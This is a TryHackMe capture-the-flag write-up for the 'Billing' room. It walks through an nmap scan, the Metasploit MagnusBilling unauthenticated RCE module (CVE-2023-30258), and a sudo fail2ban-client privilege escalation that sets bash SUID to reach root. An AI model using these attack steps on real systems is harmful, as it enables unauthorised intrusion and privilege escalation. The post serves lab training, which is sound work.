---
title: "Billing"
date: 2025-04-23
draft: false
summary: "Writeup for Billing CTF challenge on TryHackMe."
tags: ["linux", "sudo", "rce"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/billing/cover.webp"
  caption: "Billing TryHackMe Challenge"
  alt: "Billing cover"
platform: "TryHackMe"
---

Some mistakes can be costly. Gain a shell, find the way and escalate your privileges!
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/billing

## Reconnaissance

I performed an **nmap** aggressive scan on the target to find open ports, os information, service versions and to run a default nse script scan.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN billing.nmap
```

![](https://cdn.ziomsec.com/billing/1.webp)

## Initial Access

The target had a web server running so I accessed the web page through my browser.

![](https://cdn.ziomsec.com/billing/2.webp)

I accessed the `robots.txt` file but did not find any new endpoints. I then moved onto port 5038 and accessed it through my browser.

![](https://cdn.ziomsec.com/billing/3.webp)

Since I did not have much to work with, I started the **metasploit** framework and looked for exploits for **asterisk**.

```shell
msfconsole
search asterisk
```

![](https://cdn.ziomsec.com/billing/4.webp)

Since there was a well ranked RCE exploit for **mbilling** service, I decided to give it a try.

```shell
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
```

I configured the `RHOST` and `LHOST` and ran the exploit to get a meterpreter shell.

![](https://cdn.ziomsec.com/billing/5.webp)

I spawned a **pty bash** shell and enumerated information about the current user and os kernel.

```shell
> shell
$ whoami
$ uname -a
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ export TERM=xterm
```

![](https://cdn.ziomsec.com/billing/6.webp)

I then looked for the flag and found it in *magnus* user's home directory.

```shell
cd magnus
cat user.txt
```

![](https://cdn.ziomsec.com/billing/7.webp)

## Privilege Escalation

I looked at my **sudo** privileges and found that I could run a command with sudo without password.

```shell
sudo -l
```

![](https://cdn.ziomsec.com/billing/8.webp)

I ran the command to see what it did. It looked like a utility to ban and unban IPs...

```shell
sudo /usr/bin/fail2ban-client
```

![](https://cdn.ziomsec.com/billing/9.webp)

This was the first time I came across such an attack vector. So I searched online and found this guide that showed how it could be used for privilege escalation:
- https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-client-privilege-escalation/

![](https://cdn.ziomsec.com/billing/10.webp)

I copied the steps shown and managed to add an **suid** bit to **`/bin/bash`**.

```shell
sudo /usr/bin/fail2ban-client status
sudo /usr/bin/fail2ban-client get ip-blacklist actions
sudo /usr/bin/fail2ban-client set ip-blacklist addaction evil
sudo /usr/bin/fail2ban-client set ip-blacklist action evil actionban "chmod +s /bin/bash"
sudo /usr/bin/fail2ban-client set ip-blacklist banip 1.2.3.5
ls -la /bin/bash
```

![](https://cdn.ziomsec.com/billing/11.webp)

Finally, I executed `/bin/bash` in privileged mode and found the root flag inside the **`/root`** directory.

```shell
/bin/bash -p
cd /root
cat root.txt
```

![](https://cdn.ziomsec.com/billing/12.webp)

## Closure

Here's a short summary of how I pwned **Billing**:
- I performed an **nmap** scan on the target and found MagnusBilling and Asterisk running on port 80 and 5038 respectively.
- I found an RCE exploit for MagnusBilling and got meterpreter shell through it.
- I captured the first flag from `magnus`'s home directory.
- Enumerating my `sudo` privileges revealed I could run an IP banning/unbanning utility without password.
- I found an article online that demonstrated how that could be used to escalate privileges and used it to gain root shell.
- Finally, I captured the last flag from the `/root` directory.

That's it from my side!
Until next time :)

---
